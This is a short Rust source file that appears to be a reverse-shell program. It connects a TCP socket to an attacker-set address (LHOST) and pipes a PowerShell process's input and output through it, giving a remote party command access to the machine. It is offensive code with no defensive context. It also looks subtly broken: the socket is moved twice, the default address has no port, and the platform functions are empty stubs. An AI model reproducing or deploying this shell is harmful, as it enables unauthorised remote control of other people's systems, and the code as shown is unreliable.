use std::{
    net::TcpStream,
    process::{Command, Stdio},
};

#[cfg(windows)]
fn establish_stream() {}

#[cfg(unix)]
fn establish_stream() {}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let home = option_env!("LHOST").unwrap_or("0.0.0.0");
    let s = TcpStream::connect(home).unwrap();

    Command::new("powershell")
        .stdin(Stdio::from(s))
        .stdout(Stdio::from(s))
        .spawn()
        .unwrap()
        .wait()
        .unwrap();

    establish_stream();
    Ok(())
}
